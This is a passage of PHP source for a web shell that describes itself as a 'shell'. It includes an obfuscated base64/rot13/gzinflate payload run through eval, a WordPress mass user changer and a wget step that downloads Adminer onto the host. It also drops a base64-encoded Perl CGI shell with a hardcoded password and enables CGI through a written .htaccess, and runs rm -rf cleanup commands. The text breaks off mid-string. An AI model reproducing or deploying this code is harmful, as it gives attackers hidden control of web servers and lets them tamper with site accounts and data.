    $mass_script = "PD9wSHAgJGhleCA9ICI3VnpyUnR0VkV2KzhSL0UvekxxNHNna1BrWG0yc3BVQUcrQjV2TnlkWkp5Rld3ZzVsMU9ua1RDK3NUUzJ0RlZiL08vWE15UEo4Z3VMOUh6WXF6cXFWZlNZL3ZWdytpWGg5c2ZZanZ0WmE0MXRHRE1uNGNPK1kxM3Fzdm91T2RqK3NMa1JqMWFEYks1VUV6b1FZWVA1SXpoNG5GMmQ5VUpic0hHWC9MQzlXbzZPVlhvUTI3VjY4c2ZtQm9FZkVWR1UxQTlNNE1hT2Fzd1Q0VzJOMmxKNWgyZkFDQlB1dldPSldqM0NmTWVocmlmQzJ2YWhsYTJ1Zjhnd0htOFBEcCswREZ2OXM5UFdiTUZnYmVsWVBhRDJPSjdVdjFjeDZubVkzbFNVYkt4ZXJKVS9IOVBITUdrYk5jZU43My9xRjR0M29NSzdhdSsyUDFsS2lnZlJxQ1UyMlhERUltYkxMWmRGcjBsZXZSVnNQQWdFY0FSWlkrcHJNYlVadWJaUVFHN2tNMXJBZDYxdWJSUGJqM2xtNDBic2lzQ2o3a010UStEN2taZGhZV2ZDOEh6b0NPS0pCOCtDV29oNnN1OVJEa1JxcnJnZGdnSG5ZbUZodExnWHMvR1FaK3h1clNUU3gyU2NpTDdqZTMwd2pDZDVqeTJvZXUzbmI0TUJDaFZ6OUJKZTBHbzRjSU1RTk1zdHJTL1V2NjVjS0I2Y2hJWmd3TTBOaVR5OVNzWWVSa3J3SUlJTkxORmxVN2F5cGVWOVJpd2NQZ3YrWG04djRxcTFQbXVYbEV2U2ZQbng2L3p0MzFJNm9oTE1aTVdrN3dxd2RDQWFhT3ZPdXVmdW5UVVlET0JWMmVqT3NpQUc2dkNyTU9jWlZnZEhHQ24zZ2dnUU1zdkdCY0dDSG1iZVNDUDdtYmo3cEhOU251ZUVOR0RXd05uVERxMDhZSDdqRkVTbUJKRHRYVU0zQkRFWTIvY2VjejJ6T2xUTnptcTU5TjVYWFA5V2RwcGpORmpya2RyaWtjV1ZhOTdRVkpxS01NYXdCYy96UnVzRjVvVTFsNWNJaGl6MkJMTlBNZVorNGt5UWM3M1luckJYckQrNXZzTVR2STBMcHJFZFIyOThCdTdrOFVsUkhRUm03amdXVWJlVjBBQ1VhMVdUdFhsaStRUmxGY1h3RE5QWWZzbnVuanJDN21YWHcrbVp4SUdLbk56Z0lmZjRpRE5FVm9SZWtzUXM0YU9sSWp4YVFyUERwL1hWTDRGTnM2YjJkcElsdGU5d1U5K29UR05xbnVCL3YvcHliVHhiL2RhWitPM0IyelhtaFJVdnNDMnMvdE1hYVdaUVR1WUM3R2NqN2s4K09YZWZmOTc3aWV4ODVtbWdtVStDSVR2WEV4c3FleGRjSDJIUkpCUXUreHk3ekNNN2Y3czZ2NzBoTy9MZlpqNVg0SDRMR2o5TXRwcCtBaG9WcDUrRVlRS0JIZGs1NGFtNGlGQXZPbTJWQ2FJNWtFb3lUY0JobXh0YU1XTWh4ZmJzVm5rTFpYY1hTcnJVRHNsZi9uWDIvdHJ1dGM3N242OWliU2VkMjk0VCtkZitxN0xweVplVDd0ZUNWMWRRN2lUNlNZbTQzYngrUlZoaWFadFVQeHk4MlFlU3lpNG50eGZsWWhPWGozTWRZY2JmOUUyNWRZblBlc1VzN2xSZVEvWWluaVJGMzMvNzREWGtCQXJ3eWtQYTBwUndDblpsa2QyTVNiWEJqUHVPbFRVYkVtQzNFRzlCNGExbzNlVzB1K3FEek5CdU5mWmYvYno5L3VHOTdNc3k2cXpYeXNUS09Wa2J6TkxOTDYrL3FpWkdYVVhLekJob1dPcVVMUVdadU92eUlZUjNCRDJIU0tLeDlyWE9FWFJFalJ3ZGs5ckYxZTFlNmRvdVRFL2srQ09vRW1DRU5FelMrbldjb3I5TUR6SGZ4blVBMWF1c0oxN2RrblVZM1dwSDFuQyt2ZEFnMHg1dlBkQlBxNkFoc242Z0F2MWMyZGZrYkhxdnhQKzVFcTdoOGpxOUh1NStjWUVwRWo4VWVVNm9YMU4ra2dpdzEyMFlFeGphUW93aE1TTkRUbURLUGd2a3Q4TXFBVERIM1dwWTIzekt1alJhaFJ1SUNvRUUzbm9NakM0WUZ3RVYwSVZkLzNNMHg2V2hIMnZteEFzZ0tJMkI1VjdRbnlSbkJObWpBTGsrcStBSk00L2FURGJQbjZlclExdVFWajBreWlpaEV5eUU4RGdTVDc2RTQwdUR5TXFDdHlrTzRPSU1DV0NMQWNNcWtTOVM0aGp3cmtPa0ZBbWhZZUlnN2w5d0FkNWcvZHZBYVlCMEdJaG9yQlFMTCtzMGduNGpTakhkUEl0T3FGaWdwKzIyS3NpU0xteHMrRTlzY2U1UGIzSEpDNG1pc2hjU0krVlNKL3JOR09vbUVsQ0ZQUkpRY2g4a0JnUStGdUVORnVGcXRRNkxJb01mQ2FHQ2R4VlZ4WWdiVVhiQVNScTFJc2lGQkRFaHlKOEFVQzR6WUE0RG11QVZ3ZXVCU2dPSlkyamFPc2RQME5Wc3B5SlJoSWQxdGMvT1Fadm5QWG5BdHJJL1kzRDluQm5DQ2Ftc1JITkRESGxuZWEvc1UxN2daTmNudnhyd0dMd3MzVUVUNi8zeWxSVVNJc0JRbkRZLzlacExERGNVTGhLREdzRG8zbHozUWREYmtzVENVMktNQ1JDdFFhZlo2eGhFaWJ0dmNtTDBJclVNQUhJNTExbkdOWk5pa1NpWDF6YzMrT1JuR1NjSlBqbU5qS0JjdHYrT1V2Q0hTMXJRQ0xlZGs4NnZQU3dJdC9seDVhTk5VcERVQklqT0NYUENWS2NGTTA2a3NjeUVSV0FRcTN2VjYvNXAybE9iS2hMQkkvWFJtcG1CeVdVTnRtN05rZzIyVUJ5WmdibnN0SDdyYnZmcGtyTlVnVFh2eUFSVnE5ZDZON0ZzcHlVQzM4V21ESE1DcE5XNXdUOGc4UVQvWTNFQVVJYVBnZEF4RURaVmlMTnBzM3ZWZG02OTdNeHFnNGd6cklzNGMyQTYzZTUyRzkzRmFvS0ErdWdPbkJ0T2RyZlFRa3Q2aG40NDh2RVFUUE51cGtndzB5VDh2NUl1NlVteGZmc3R0dWxCc1FCTXpjSy9wWndDb2Q4L085d1cySXl0dlJaZHdUSVlVQSsrSmw2OWpGTUxmK204cEE5TVhFY2dwdy81VUNzZUNRdWgzaWtqTWE0TVlGbGZCSnNCTW00WEF6dWtYazBpTWJUTGJ3WFJMK21Nb0tEM0tBOTJNekIxWkZsU2NGN1JrRGhEUTdBeG9BdUJvVlV5NG4vRkorUENtR3g3YlA0dGZUenVIOElPS24ydTlUOXRvVTdFeGM4Q29pRU5XRGo3bVZrMFhJRVVNL3IyemV0cVJnaVp5cVVmU3ZvQVNMYlVISndacEN0d1ZkT2ljUkxPbkwxeDBqSUNOdXV1R0NTZExNd0lwVmlXVGl4USs1aVhMNU5naGxITFdKbFdNRkNpVGt3ekUxSzZ1Qm1OeU9wZXUzemd1enh4STRka3NsQWczYkpzeXZNNW52bko2UmNNVkJYelBEd0ZUcVlEUFhkVGVDSlhNMDBaODNKbW40cmZMQUF3Vzg3b2lZaUVpWEpxbEJpSzcwZUtGYk5ISmJ2dmxTMmh4azlxNThlcnlqOXd4NWU2bE5qc3p1cStqUEIyOXRKR1VuZ3ZuUzdOZjRyNXhxMWNqSVc1eTIrR1NYaXFCbURWdFpMRzh1SzZidGgwaFZ5WXp5eTJJcHY0T3lMUFZTckg5VU52RnJKMnNLV1NLR1l0bVJwOUVlZmxScVl6Q2hzWklyMFNIRzllem0vcWJuUEorN2toMGRJVTZPeDg2TXhWZFhhMms1U0dQdk5ZK1R5b25CZzlnK1NSamhJeE53Tk5XNkgxMm5iTUZ4cHMvV3B5UjQyQ1ltNWVtSHlwbzYyTzQ0cno0b3Y1Um4xbVdPMHdrTFhXUFQ3a0pHWEYrT2hoTVhMZDFZNFB4MkJ1RXRDRXVsU2p4QmZIbjZndERpMXM5ZmpRNHZDYndkUythTFp0U1pyTmpXeHNWL1BUUmFBbS9DOFp3OExSb3ZEWmIwdlhMYi9XYjk4azZ0SmNTMDdjTEJWSmxqaGJZbGwxOVQwRUw1Wk5STTBJV2szcVczeWVsVjFHU0JaOXRwSnpSVTd2a0pKSGF4RU5KVFFBM3RVSUR5UVFuRmduTE9UKzdydFFkVzBTVlhESFZ5QTUyUzQvbGxFZ3RvUWtTU1BEUUI0a1kyZEhsL2ZxeEtVRE9INW1RNWVPREZTdkR3N3FBSmJMcGNUSUdoN1NxS2xXU0ExSFVYRW1xWlh6MDl4VVJhVGN4SWROcm96elhWcWZnaWlaZFcyWDRKd3dZcGpJS3dPWkNkK1R0ejhlT0E4ZjRGTWs0bGJrd1kzWEI2QzBSWmJxT2ZsN0RxRUhOOEMzQzBZVE9EbTA5SUt5R0dZa01wQ25OTC9DVEFXaXpQT0JycVdQaUtZdmtTNEtTbndEQnBEOW9nNVZpZXRWT2tWVG5SdnZNTFloaVJOaTZDaHRmNVRHMG1BNVlBdFo3WDMvdldjQXl3dmxQKzdVcWZUMlBaR2ZqLzhMIjsKZXZhbChzdHJfcm90MTMoZ3ppbmZsYXRlKHN0cl9yb3QxMyhiYXNlNjRfZGVjb2RlKCgkaGV4KSkpKSkpOyA=";
    $mass = fopen($file_mass, "w");
    fwrite($mass, base64_decode($mass_script));
    echo "<br><center>  <iframe src='priv_sym/conf.php' width='900' height='480'></iframe></a>";
    echo '</div>';
    hardFooter();
}
function actionEdituser() {
    hardHeader();
    echo "<center><h1>Wordpress Mass User Changer</h1><div class=content><br>";
    echo "<br><center>  <iframe src='?user' width='900' height='400'></iframe></a>";
    echo '</div>';
    hardFooter();
}
function actionLogout() {
    exec("rm -rf priv_sym priv_cgi adminer.php");
    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
    die("</br></br><body bgcolor='#000000'><pre align=center><form method=post style='color:#ffffff;text-align: center;'>Bye -,-<br><br></form> </body>");
}
function actionSelfRemove() {
    if($_POST['p1'] == 'yes')
        if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
            die('Shell has been removed');
        else
            echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        hardHeader();
    echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
    hardFooter();
}


function actionAdminer() {
    hardHeader();
    echo "<center><h1>Adminer</h1><div class=content><br>";
    exec("wget https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php && mv adminer-4.2.4.php adminer.php ");
    echo "<center><font color=white><br><br><a href='adminer.php' target='_blank'>-> Adminer Login <-</a><br><br></font></center>";
    echo '</div>';
    hardFooter();
}
function actionBruteforce() {
    hardHeader();
    echo "<center><h1>Cgi Telnet</h1><div class=content><br>";
    $cgi_dir = mkdir('priv_cgi', 0755);
        chdir('priv_cgi');
    $file_cgi = "cgi.priv";
        $memeg = ".htaccess";
    $isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .priv \n AddHandler cgi-script .priv \n AddHandler cgi-script .priv";
    $htcgi = fopen(".htaccess", "w");
    $cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluCnVzZSBNSU1FOjpCYXNlNjQ7CiRWZXJzaW9uPSAiUFJJVjgtU0hFTEwgVmVyc2lvbiAxLjMiOwokRWRpdFBlcnNpb249Ijxmb250IHN0eWxlPSd0ZXh0LXNoYWRvdzogMHB4IDBweCA2cHggcmdiKDI1NSwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApLCAwcHggMHB4IDVweCByZ2IoMzAwLCAwLCAwKTsgY29sb3I6I2ZmZmZmZjsgZm9udC13ZWlnaHQ6Ym9sZDsnPlBSSVY4LVNIRUxMPC9mb250PiI7CgokUGFzc3dvcmQgPSAiaGFja2VyMDg4MiI7CQkJIyBDaGFuZ2UgdGhpcy4gWW91IHdpbGwgbmVlZCB0byBlbnRlciB0aGlzIHRvIGxvZ2luLgpzdWIgSXNfV2luKCl7Cgkkb3MgPSAmdHJpbSgkRU5WeyJTRVJWRVJfU09GVFdBUkUifSk7CglpZigkb3MgPX4gbS93aW4vaSl7CgkJcmV0dXJuIDE7Cgl9CgllbHNlewoJCXJldHVybiAwOwoJfQp9CiRXaW5OVCA9ICZJc19XaW4oKTsJCQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZgoJCQkJCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UCgkJCQkJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBvbiBVbml4LCB5b3UKCQkJCQkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzCgkJCQkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzCgkJCQkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDAwMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCQkJCQkjIERvbid0IHNldCB0aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcwoJCQkJCQkJCSMgdXNlZnVsIGZvciBjb21tYW5kcyB0aGF0IG1heSBoYW5nIG9yIHRoYXQKCQkJCQkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkJCQkJIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJzLiBJdCBpcwoJCQkJCQkJCSMgaWdub3JlZCBvbiBOVCBTZXJ2ZXJzLgoKJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBvdGhlcndpc2UKCQkJCQkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQKCQkJCQkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCQkJCQkjIHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdAoJCQkJCQkJCSMgaXMgYmVpbmcgZ2VuZXJhdGVkLgoKIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQoKJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7CiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsKJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7CiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7CiRjb2xzPSAxNTA7CiRyb3dzPSAyNjsKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkkQm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wiLy9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7IAoJCX0KCX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJbXkgJGRpciA9JEN1cnJlbnREaXI7CgkkZGlyPX4gcy9cXC9cXFxcL2c7CglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsKCXByaW50IDw8RU5EOwo8aHRtbD4KPGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4KPHRpdGxlPlByaXY4IFNoZWxsIENnaTwvdGl0bGU+CgokSHRtbE1ldGFIZWFkZXIKCjwvaGVhZD4KPHN0eWxlPgpib2R5ewpmb250OiAxMHB0IFZlcmRhbmE7Cn0KdHIgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKY29sb3I6ICNmZmZmZmY7Cn0KdGQgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKY29sb3I6ICMwOTYwZmY7CmZvbnQ6IDEwcHQgVmVyZGFuYTsKfQoKdGFibGUgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKQkFDS0dST1VORC1DT0xPUjogIzExMTsKfQoKCmlucHV0IHsKQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7CkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOwpmb250OiAxMHB0IFZlcmRhbmE7CmNvbG9yOiAjZmZmZmZmOwp9CgppbnB1dC5zdWJtaXQgewp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47CmNvbG9yOiAjRkZGRkZGOwpib3JkZXItY29sb3I6ICMwOTYwZmY7Cn0KCmNvZGUgewpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOwpjb2xvcjogd2hpbGU7Cn0KCnJ1biB7CmJvcmRlcgkJCTogZGFzaGVkIDBweCAjMzMzOwpmb250OiAxMHB0IFZlcmRhbmEgYm9sZDsKY29sb3I6ICNGRjAwQUE7Cn0KCnRleHRhcmVhIHsKQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7CkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7CmZvbnQ6IEZpeGVkc3lzIGJvbGQ7CmNvbG9yOiAjYWFhOwp9CkE6bGluayB7CglDT0xPUjogIzA5NjBmZjsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KQTp2aXNpdGVkIHsKCUNPTE9SOiAjMDk2MGZmOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmhvdmVyIHsKCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsKCWNvbG9yOiAjZmZmZmZmOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmFjdGl2ZSB7Cgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUKfQoKLmxpc3RkaXIgdHI6aG92ZXJ7CgliYWNrZ3JvdW5kOiAjNDQ0Owp9Ci5saXN0ZGlyIHRyOmhvdmVyIHRkewoJYmFja2dyb3VuZDogIzQ0NDsKCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsKCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmU7Cn0KLm5vdGxpbmV7CgliYWNrZ3JvdW5kOiAjMTExOwp9Ci5saW5lewoJYmFja2dyb3VuZDogIzIyMjsKfQo8L3N0eWxlPgo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4KZnVuY3Rpb24gY2htb2RfZm9ybShpLGZpbGUpCnsKCS8qdmFyIGFqYXg9J2FqYXhfUG9zdERhdGEoIkZvcm1QZXJtc18nK2krJyIsIiRTY3JpcHRMb2NhdGlvbiIsIlJlc3BvbnNlRGF0YSIpOyByZXR1cm4gZmFsc2U7JzsqLwoJdmFyIGFqYXg9IiI7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZVBlcm1zXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1jaG1vZCB0eXBlPXRleHQgc2l6ZT01IC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBhamF4ICsgIicgdmFsdWU9T0s+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckZGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsKfQpmdW5jdGlvbiBybV9jaG1vZF9mb3JtKHJlc3BvbnNlLGkscGVybXMsZmlsZSkKewoJcmVzcG9uc2UuaW5uZXJIVE1MID0gIjxzcGFuIG9uY2xpY2s9XFxcImNobW9kX2Zvcm0oIiArIGkgKyAiLCciKyBmaWxlKyAiJylcXFwiID4iKyBwZXJtcyArIjwvc3Bhbj48L3RkPiI7Cn0KZnVuY3Rpb24gcmVuYW1lX2Zvcm0oaSxmaWxlLGYpCnsKCXZhciBhamF4PSIiOwoJZi5yZXBsYWNlKC9cXFxcL2csIlxcXFxcXFxcIik7Cgl2YXIgYmFjaz0icm1fcmVuYW1lX2Zvcm0oIitpKyIsXFxcIiIrZmlsZSsiXFxcIixcXFwiIitmKyJcXFwiKTsgcmV0dXJuIGZhbHNlOyI7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9cmVuYW1lIHR5cGU9dGV4dCB2YWx1ZT0gJyIrZmlsZSsiJyAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0